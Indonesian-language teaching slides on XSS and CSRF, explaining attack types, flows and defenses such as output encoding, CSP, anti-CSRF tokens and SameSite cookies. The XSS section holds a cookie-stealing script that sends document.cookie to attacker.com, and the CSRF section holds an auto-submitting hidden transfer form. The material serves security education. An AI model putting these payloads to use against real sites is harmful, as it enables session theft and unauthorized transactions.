‚ö° Cross-Site Scripting (XSS)

Apa itu XSS?

Serangan yang menyuntikkan script berbahaya (biasanya JavaScript) ke dalam halaman web yang dilihat pengguna lain.

üò± Mengapa Bahaya?
  • Mencuri session cookie
  • Phishing dalam site asli
  • Keylogging
  • Defacement
üìà Statistik
  • 50-80% aplikasi rentan XSS
  • Salah satu yang paling umum
  • Mudah dieksploitasi
  • Dampak sangat signifikan

üéØ 3 Tipe XSS

1. Reflected XSS

Non-Persistent

Script di-reflect dari server

‚úì Melalui URL/link

‚úì Butuh social engineering

‚úì Tidak disimpan

2. Stored XSS

Persistent

Script disimpan di server

‚úì Paling berbahaya

‚úì Otomatis menyerang

‚úì Disimpan di database

3. DOM-based XSS

Client-Side

Script eksekusi di browser

‚úì Tidak ke server

‚úì Sulit dideteksi

‚úì Manipulasi DOM

üíª Contoh Serangan Reflected XSS

// Website dengan fitur pencarian vulnerable
http://contoh.com/search?q=laptop
// Halaman menampilkan: "Hasil pencarian untuk: laptop"

// Penyerang membuat URL berbahaya:
http://contoh.com/search?q=<script>alert('XSS')</script>

// Ketika korban klik link, script dieksekusi!
<script>
document.location='http://attacker.com/?cookie=' + document.cookie;
</script>

‚ö†Ô∏è Cookie session korban terkirim ke penyerang!

üõ°Ô∏è Cara Mencegah XSS

1. Input Validation
Validasi semua input dari user dengan whitelist
2. Output Encoding
Encode karakter khusus: < menjadi &lt;, > menjadi &gt;
3. Content Security Policy (CSP)
Header yang membatasi sumber script yang boleh dieksekusi
4. HTTPOnly Cookies
Cookie tidak bisa diakses oleh JavaScript
5. Gunakan Framework Modern
React, Angular, Vue.js sudah auto-escape output

üé≠ Cross-Site Request Forgery (CSRF)

Apa itu CSRF?

Serangan yang memaksa pengguna yang sudah login untuk melakukan aksi yang tidak diinginkan tanpa sepengetahuan mereka.

üîë Kunci CSRF

Browser secara OTOMATIS mengirim cookie pada setiap request ke domain yang sama, bahkan jika request dibuat dari website lain!

‚öîÔ∏è Alur Serangan CSRF

0Ô∏è‚É£ Setup: Korban sudah login ke bank.com ‚Üí Cookie tersimpan di browser
1Ô∏è‚É£ Penyerang: Membuat halaman jahat dengan form transfer dana
2Ô∏è‚É£ Korban: Mengklik link berbahaya (email phishing)
3Ô∏è‚É£ Browser: Auto-submit form + cookie valid terkirim ke bank.com
4Ô∏è‚É£ Server Bank: "Cookie valid? OK, proses transfer!" ‚úÖ
5Ô∏è‚É£ Hasil: Dana ditransfer tanpa sepengetahuan korban! üí∏

üíª Contoh Kode CSRF Attack

<!-- Halaman berbahaya yang dibuat penyerang -->
<html>
<body>
<h1>Selamat! Anda Menang Hadiah!</h1>

<!-- Form tersembunyi yang auto-submit -->
<form action="http://bank.com/transfer" method="POST">
<input type="hidden" name="to" value="attacker"/>
<input type="hidden" name="amount" value="1000000"/>
</form>

<script>
document.forms[0].submit(); // Auto-submit!
</script>
</body>
</html>

üõ°Ô∏è Cara Mencegah CSRF

1. Anti-CSRF Token
Token unik untuk setiap request/session yang di-validate server
2. SameSite Cookie Attribute
Cookie tidak dikirim pada cross-site request (SameSite=Strict/Lax)
3. Double Submit Cookie
Token disimpan di cookie DAN parameter request
4. Re-authentication
Minta password lagi untuk aksi sensitif (transfer dana, ubah password)
5. Check Referer Header
Validasi bahwa request berasal dari domain yang benar

‚öîÔ∏è XSS vs CSRF

Aspek XSS CSRF

Memanfaatkan Kepercayaan user ke website Kepercayaan website ke browser
Eksekusi Script di browser korban Request atas nama korban
Butuh Login? Tidak wajib Ya, harus sudah login
Pencegahan Utama Output encoding, CSP Anti-CSRF token

üîÑ Secure Development Lifecycle

1. Requirements: Tentukan security requirements & threat model
2. Design: Security architecture, principle of least privilege
3. Implementation: Secure coding, code review, SAST tools
4. Testing: Pentest, vulnerability scan, DAST tools
5. Deployment: Secure configuration, hardening
6. Maintenance: Patch management, monitoring, incident response

Ingat: Security bukan one-time activity, tapi continuous process!

‚ú® Best Practices Summary

‚úì DO (Lakukan)

  • Validate ALL user input
  • Encode ALL output
  • Update software regularly
  • Implement CSRF tokens
  • Use HTTPS everywhere
  • Enable security headers
  • Log security events
  • Use strong passwords

‚úó DON'T (Jangan)

  • Trust user input
  • Use default configurations
  • Store passwords in plaintext
  • Ignore security updates
  • Display detailed errors
  • Use eval() atau innerHTML
  • Disable security features
  • Forget about logging
